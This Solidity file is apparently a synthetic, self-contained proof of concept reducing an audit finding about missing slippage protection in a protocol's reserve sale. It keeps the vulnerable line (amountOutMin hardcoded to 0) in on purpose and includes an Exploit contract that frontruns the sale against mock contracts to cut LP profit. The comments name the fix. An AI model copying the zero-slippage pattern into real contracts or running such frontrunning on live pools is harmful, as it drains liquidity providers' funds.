// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cork — Reserve sales vulnerable to MEV due to missing slippage protection
    in _sellDsReserve  (Sujith Somraaj / Cantina Cork Dec 2024, finding #53125)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _sellDsReserve sells protocol DS reserves via __swapDsforRa
    with amountOutMin HARDCODED to 0:
        __swapDsforRa(..., params.amountSellFromReserve, 0, _moduleCore);
    When a user buy triggers a reserve sale, MEV bots can move the pool price
    first so the reserve sale realizes far less RA profit for LPs (~36% in the
    report's e2e). The zero min-out is the blamed line.

    FIX: pass a non-zero minOut (e.g. oracle/spot-bounded) into the reserve sale. */

contract MockRA {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockDS {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Constant-product DS→RA pool.
contract MockAMM {
    MockRA public immutable ra;
    MockDS public immutable ds;
    uint256 public reserveRa;
    uint256 public reserveDs;

    constructor(MockRA ra_, MockDS ds_) {
        ra = ra_;
        ds = ds_;
    }

    function seed(uint256 raAmt, uint256 dsAmt) external {
        ra.mint(address(this), raAmt);
        ds.mint(address(this), dsAmt);
        reserveRa = raAmt;
        reserveDs = dsAmt;
    }

    function getAmountOutDsForRa(uint256 dsIn) public view returns (uint256) {
        return (reserveRa * dsIn) / (reserveDs + dsIn);
    }

    function swapDsForRa(uint256 dsIn, uint256 amountOutMin) external returns (uint256 amountOut) {
        amountOut = getAmountOutDsForRa(dsIn);
        if (amountOut < amountOutMin) revert("InsufficientOutputAmount");
        ds.transferFrom(msg.sender, address(this), dsIn);
        reserveDs += dsIn;
        reserveRa -= amountOut;
        ra.transfer(msg.sender, amountOut);
    }

    function dumpDs(uint256 dsIn) external returns (uint256 raOut) {
        raOut = getAmountOutDsForRa(dsIn);
        ds.transferFrom(msg.sender, address(this), dsIn);
        reserveDs += dsIn;
        reserveRa -= raOut;
        ra.transfer(msg.sender, raOut);
    }
}

/// @notice Reduced FlashSwapRouter with DS reserves and _sellDsReserve.
contract FlashSwapRouter {
    MockAMM public immutable amm;
    MockRA public immutable ra;
    MockDS public immutable ds;

    uint256 public dsReserve;
    uint256 public lpProfitRa;
    uint256 public lastReserveSaleProfit;

    constructor(MockAMM amm_, MockRA ra_, MockDS ds_) {
        amm = amm_;
        ra = ra_;
        ds = ds_;
    }

    function fundReserve(uint256 amount) external {
        ds.transferFrom(msg.sender, address(this), amount);
        dsReserve += amount;
    }

    /// @dev User buy triggers optional reserve sale.
    function swapRaForDs(uint256 raIn, uint256 amountSellFromReserve) external returns (uint256 dsOut) {
        ra.transferFrom(msg.sender, address(this), raIn);
        dsOut = raIn;
        ds.mint(msg.sender, dsOut);
        if (amountSellFromReserve > 0 && amountSellFromReserve <= dsReserve) {
            _sellDsReserve(amountSellFromReserve);
        }
    }

    /// @dev VERBATIM bug: reserve sale with amountOutMin = 0.
    function _sellDsReserve(uint256 amountSellFromReserve) internal {
        dsReserve -= amountSellFromReserve;
        // FIX: pass a real minOut (spot/oracle-bounded) instead of 0.
        uint256 profitRa = _swapDsforRa(amountSellFromReserve, 0); // @> VULN: amountOutMin hardcoded to 0
        lastReserveSaleProfit = profitRa;
        lpProfitRa += profitRa;
    }

    function _swapDsforRa(uint256 amount, uint256 amountOutMin) internal returns (uint256 amountOut) {
        amountOut = amm.swapDsForRa(amount, amountOutMin);
    }
}

contract Attacker {
    function dump(MockAMM amm, uint256 dumpAmount) external {
        amm.dumpDs(dumpAmount);
    }
}

contract Exploit {
    MockRA public ra; // CREATE nonce 1
    MockDS public ds; // CREATE nonce 2
    MockAMM public amm; // CREATE nonce 3
    FlashSwapRouter public router; // CREATE nonce 4
    Attacker public attacker; // CREATE nonce 5

    uint256 public constant RESERVE_SELL = 10 ether;
    uint256 public constant DUMP = 40 ether;
    uint256 public fairProfit;
    uint256 public actualProfit;

    constructor() {
        ra = new MockRA();
        ds = new MockDS();
        amm = new MockAMM(ra, ds);
        router = new FlashSwapRouter(amm, ra, ds);
        attacker = new Attacker();

        amm.seed(100 ether, 100 ether);

        // Fund router DS reserve
        ds.mint(address(this), RESERVE_SELL);
        router.fundReserve(RESERVE_SELL);

        // Fund attacker DS for dump
        ds.mint(address(attacker), DUMP);

        fairProfit = amm.getAmountOutDsForRa(RESERVE_SELL);

        ra.mint(address(this), 1 ether);
    }

    function run() external {
        require(fairProfit > 0, "no fair profit");

        // Attacker frontruns: dumps DS to tank RA-out for the reserve sale.
        attacker.dump(amm, DUMP);

        // User swap triggers reserve sale with minOut=0.
        router.swapRaForDs(1 ether, RESERVE_SELL);

        actualProfit = router.lastReserveSaleProfit();

        // HARM: LP profit from the reserve sale is materially reduced vs fair.
        require(actualProfit < fairProfit, "profit should drop under MEV");
        require(actualProfit * 100 < fairProfit * 80, "MEV haircut should be material");
        require(router.lpProfitRa() == actualProfit, "lp profit tracking");
        require(ra.balanceOf(address(attacker)) > 0, "attacker extracted RA");
    }
}
